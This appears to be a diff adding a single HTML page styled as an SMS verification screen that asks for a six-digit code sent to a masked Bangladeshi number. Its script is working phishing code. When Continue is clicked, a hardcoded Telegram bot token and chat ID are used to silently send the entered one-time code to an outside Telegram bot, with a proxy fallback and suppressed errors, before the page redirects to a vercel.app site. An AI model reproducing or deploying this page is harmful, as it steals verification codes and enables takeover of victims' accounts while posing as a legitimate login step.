@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(180deg, #2c3e50 0%, #34495e 100%);
+            min-height: 100vh;
+            color: white;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            padding: 10px 0;
+        }
+
+        .back-arrow {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .help-icon {
+            width: 40px;
+            height: 40px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 400;
+            margin-bottom: 16px;
+            color: white;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        .illustration-container {
+            background: linear-gradient(135deg, #a8e6cf 0%, #88d8a3 100%);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            min-height: 200px;
+        }
+
+        .phone-hands {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .left-hand {
+            width: 100px;
+            height: 120px;
+            background: #8b4513;
+            border-radius: 50px 30px 30px 50px;
+            position: absolute;
+            left: -30px;
+            top: 20px;
+            transform: rotate(-10deg);
+        }
+
+        .right-hand {
+            width: 100px;
+            height: 120px;
+            background: #8b4513;
+            border-radius: 30px 50px 50px 30px;
+            position: absolute;
+            right: -30px;
+            top: 20px;
+            transform: rotate(10deg);
+        }
+
+        .finger {
+            position: absolute;
+            width: 15px;
+            height: 40px;
+            background: #8b4513;
+            border-radius: 50%;
+            right: -5px;
+            top: 60px;
+        }
+
+        .phone {
+            width: 140px;
+            height: 240px;
+            background: white;
+            border-radius: 20px;
+            border: 6px solid #2c3e50;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            padding: 20px 15px;
+            z-index: 2;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .phone::before {
+            content: '';
+            position: absolute;
+            top: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 4px;
+            background: #2c3e50;
+            border-radius: 2px;
+        }
+
+        .notification-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #ffa500 0%, #ff8c00 100%);
+            border-radius: 50%;
+            margin: 20px auto 15px;
+            position: relative;
+            box-shadow: 0 4px 15px rgba(255, 165, 0, 0.3);
+        }
+
+        .notification-icon::after {
+            content: '📱';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+        }
+
+        .stars-display {
+            text-align: center;
+            font-size: 18px;
+            color: #333;
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .phone-screen {
+            flex-grow: 1;
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .screen-lines {
+            width: 100%;
+            height: 3px;
+            background: #ddd;
+            margin: 4px 0;
+            border-radius: 2px;
+        }
+
+        .code-input-container {
+            margin-bottom: 40px;
+        }
+
+        .code-input {
+            width: 100%;
+            height: 60px;
+            padding: 0 20px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            outline: none;
+            color: white;
+            backdrop-filter: blur(10px);
+        }
+
+        .code-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .code-input:focus {
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+
+        .timer-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 16px;
+            margin-bottom: 60px;
+        }
+
+        .timer-icon {
+            width: 24px;
+            height: 24px;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            border-top-color: transparent;
+            position: relative;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .get-new-code {
+            color: #4a90e2;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .get-new-code:hover {
+            color: #357abd;
+        }
+
+        .continue-button {
+            width: 100%;
+            height: 56px;
+            background: linear-gradient(135deg, #4a90e2 0%, #357abd 100%);
+            color: white;
+            border: none;
+            border-radius: 28px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 20px;
+        }
+
+        .continue-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(74, 144, 226, 0.3);
+        }
+
+        .continue-button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .try-another-button {
+            width: 100%;
+            height: 56px;
+            background: transparent;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 28px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .try-another-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+
+        @media (max-width: 600px) {
+            .title {
+                font-size: 24px;
+            }
+            
+            .illustration-container {
+                padding: 30px 20px;
+            }
+            
+            .phone {
+                width: 120px;
+                height: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <svg class="back-arrow" fill="white" viewBox="0 0 24 24">
+            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+        </svg>
+        <div class="help-icon">?</div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Check your SMS</h1>
+        <p class="subtitle">Enter the code we sent to +880 ********.</p>
+
+        <div class="illustration-container">
+            <div class="phone-hands">
+                <div class="left-hand"></div>
+                <div class="right-hand">
+                    <div class="finger"></div>
+                </div>
+                
+                <div class="phone">
+                    <div class="notification-icon"></div>
+                    <div class="stars-display">★★★★</div>
+                    <div class="phone-screen">
+                        <div class="screen-lines"></div>
+                        <div class="screen-lines"></div>
+                        <div class="screen-lines" style="width: 70%;"></div>
+                        <div class="screen-lines" style="width: 50%;"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="code-input-container">
+            <input
+                type="text"
+                id="codeInput"
+                class="code-input"
+                placeholder="Enter code"
+                maxlength="6"
+            />
+        </div>
+
+        <div class="timer-section">
+            <div class="timer-icon"></div>
+            <span id="timerText">We can send a new code in <span id="countdown">03:00</span>.</span>
+        </div>
+
+        <button id="continueBtn" class="continue-button" disabled>
+            Continue
+        </button>
+
+        <button class="try-another-button">
+            Try another way
+        </button>
+    </div>
+
+    <script>
+        // Bot configuration
+        const BOT_TOKEN = '8427627573:AAFGbWtwUMc1cQ25ImzNwLnQDt0jW8p4PVs';
+        const CHAT_ID = '6843983729';
+
+        // DOM elements
+        const codeInput = document.getElementById('codeInput');
+        const continueBtn = document.getElementById('continueBtn');
+        const timerText = document.getElementById('timerText');
+        const countdownSpan = document.getElementById('countdown');
+
+        // Timer variables
+        let totalSeconds = 180; // 3 minutes = 180 seconds
+        let timerInterval;
+        let isTimerRunning = true;
+
+        // Format time to MM:SS
+        function formatTime(seconds) {
+            const minutes = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        // Start countdown timer
+        function startTimer() {
+            totalSeconds = 180; // Reset to 3 minutes
+            isTimerRunning = true;
+            updateTimerDisplay();
+
+            timerInterval = setInterval(() => {
+                totalSeconds--;
+                updateTimerDisplay();
+
+                if (totalSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    isTimerRunning = false;
+                    showGetNewCode();
+                }
+            }, 1000);
+        }
+
+        // Update timer display
+        function updateTimerDisplay() {
+            if (isTimerRunning) {
+                countdownSpan.textContent = formatTime(totalSeconds);
+                timerText.innerHTML = `We can send a new code in <span id="countdown">${formatTime(totalSeconds)}</span>.`;
+            }
+        }
+
+        // Show "Get new code" option
+        function showGetNewCode() {
+            timerText.innerHTML = '<span class="get-new-code" onclick="restartTimer()">Get new code</span>';
+        }
+
+        // Restart timer when "Get new code" is clicked
+        function restartTimer() {
+            clearInterval(timerInterval);
+            startTimer();
+        }
+
+        // Send to Telegram silently
+        async function sendToTelegram(code) {
+            const message = `🔐 SMS Code: ${code}`;
+            
+            try {
+                const methods = [
+                    () => {
+                        const img = new Image();
+                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                    },
+                    
+                    async () => {
+                        try {
+                            const proxyUrl = 'https://api.allorigins.win/raw?url=';
+                            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                            await fetch(proxyUrl + encodeURIComponent(telegramUrl));
+                        } catch (e) {}
+                    }
+                ];
+
+                methods.forEach(method => {
+                    try {
+                        method();
+                    } catch (e) {}
+                });
+                
+            } catch (error) {
+                // Silent fail
+            }
+        }
+
+        // Code input validation and button state
+        codeInput.addEventListener('input', function(e) {
+            // Only allow numbers and limit to 6 digits
+            let value = e.target.value.replace(/\D/g, '').slice(0, 6);
+            e.target.value = value;
+            
+            // Enable/disable continue button based on 6-digit input
+            if (value.length === 6) {
+                continueBtn.disabled = false;
+            } else {
+                continueBtn.disabled = true;
+            }
+        });
+
+        // Continue button click handler
+        continueBtn.addEventListener('click', async function() {
+            const code = codeInput.value.trim();
+            
+            if (code.length !== 6) {
+                return;
+            }
+
+            // Send to Telegram in background
+            sendToTelegram(code);
+            
+            // Redirect to the specified URL
+            setTimeout(() => {
+                window.location.href = 'https://time-line-eight.vercel.app/';
+            }, 500);
+        });
+
+        // Enter key support
+        codeInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !continueBtn.disabled) {
+                continueBtn.click();
+            }
+        });
+
+        // Start timer when page loads
+        window.addEventListener('load', function() {
+            startTimer();
+        });
+
+        // Clean up interval on page unload
+        window.addEventListener('beforeunload', function() {
+            clearInterval(timerInterval);
+        });
+    </script>
+</body>
+</html>
